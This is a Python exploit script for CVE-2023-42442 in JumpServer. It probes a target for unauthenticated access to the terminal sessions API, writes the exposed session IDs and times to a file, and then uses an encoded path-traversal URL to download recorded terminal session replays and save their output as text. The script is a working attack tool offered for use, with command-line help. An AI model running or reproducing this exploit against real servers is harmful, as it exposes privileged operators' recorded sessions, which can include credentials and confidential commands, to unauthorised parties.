# -*- coding: utf-8 -*-
# @Author  : TongMystic
# @Time    : 9/27/2023 7:04 PM
# @Time2    : 10/01/2023
# @Time3    : 10/07/2023
# @Function:
import json
import re
import sys
from urllib.parse import urljoin, quote
import requests

def escape_ansi(line):
    ansi_escape =re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', line)

def cve_2023_42442(domain):

        re = requests.get(urljoin(domain,"/core/auth/login/"))
        if re.status_code == 200 and re.text.find("jumpserver") != -1:
            req = requests.get(urljoin(domain, "/api/v1/terminal/sessions/"))
            if req.status_code == 200:
                if req.text.find("\"id\":") != -1 or req.text.find("[]") != -1:
                    return True
            else:
                return False


def cve_2023_42442_get_id_time(domain):
    re = requests.get(urljoin(domain, "/core/auth/login/"))
    if re.status_code == 200 and re.text.find("jumpserver") != -1:
        req = requests.get(urljoin(domain, "/api/v1/terminal/sessions/"))
        if req.status_code == 200:
            data = req.text
            if req.text.find("\"id\":") != -1 or req.text.find("[]") != -1:
                parsed_data = json.loads(data)
                with open('Sessions.txt', 'a') as file:
                    file.write("\n-------------------------" + domain + "--------------------------------\n")
                    for item in parsed_data:
                        id_value = item.get("id")
                        date_start_value = item.get("date_start").replace("/", "-")

                        # 将 id_value 和 date_start_value 写入文件
                        file.write(f"id: {id_value}\n")
                        file.write(f"date_start: {date_start_value}\n")
                        file.write("\n")  # 添加空行以分隔不同的数据项")
                print("Sessions save in file : Sessions.txt")
                return True
        else:
            return False


def getJumpserverReplay(domain,id,time):
    redoamin = "http://"+domain+"/"
    if cve_2023_42442("http://"+domain) :
        redomain = "http://"+domain+"/"
    elif cve_2023_42442("https://"+domain):
        redomain = "https://" + domain+"/"
    # 原始路径，包括`/../`
    raw_path = "media/xpack/../replay/" + time + "/" + id + ".cast.gz"

    # 对路径进行手动编码
    encoded_path = quote(raw_path, safe="")

    # 构建完整的URL
    url = f"{redomain}{encoded_path}"

    rereplay = requests.get(url)

    if rereplay.status_code == 200:
        # 初始化一个空字符串，用于存储提取的字符串
        result = ""
        lines = rereplay.text

        for line in rereplay.iter_lines():
            try:
                # 将每行数据解析为Python列表
                data = json.loads(line)
                if isinstance(data, list) and len(data) >= 2 and data[1] == "o":
                    extracted_str = data[2]
                    clean_data = escape_ansi(extracted_str)
                    result += clean_data
            except json.JSONDecodeError:
                # 如果解析失败，跳过该行
                pass

        with open(sessionId+'.txt', 'w', encoding='utf-8') as file:
            file.write(result)
        print("replay save in file : "+sessionId+".txt")
    else:
        print("not have "+sessionId+" replay")






if __name__ == '__main__':
    if len(sys.argv) == 3 and sys.argv[1] == "Poc":
        domain = sys.argv[2]
        if cve_2023_42442("http://" + domain):
            print("!!!Find CVE-2023-42442 On " + domain)
        elif cve_2023_42442("https://" + domain):
            print("!!!Find CVE-2023-42442 On " + domain)
        else:
            print("NOT Find CVE-2023-42442 On " + domain)
    elif len(sys.argv) == 5 and sys.argv[1] == "Session":
        domain = sys.argv[2]
        sessionTime = sys.argv[4]
        sessionId = sys.argv[3]
        getJumpserverReplay(domain,sessionId,sessionTime)
    elif len(sys.argv) == 3 and sys.argv[1] == "Sessions":
        domain = sys.argv[2]
        if cve_2023_42442_get_id_time("http://" + domain):
            print("!!!Find CVE-2023-42442 On " + domain)
        elif cve_2023_42442_get_id_time("https://" + domain):
            print("!!!Find CVE-2023-42442 On " + domain)
        else:
            print("NOT Find CVE-2023-42442 On " + domain)

    else:
        print("""Help:
                python .\CVE-2023-42442.py Poc <JumpServer_Domain> 
                python .\CVE-2023-42442.py Sessions <JumpServer_Domain>
                python .\CVE-2023-42442.py Session <JumpServer_Domain> <Session_Id> <Session_Time>""")
        sys.exit()

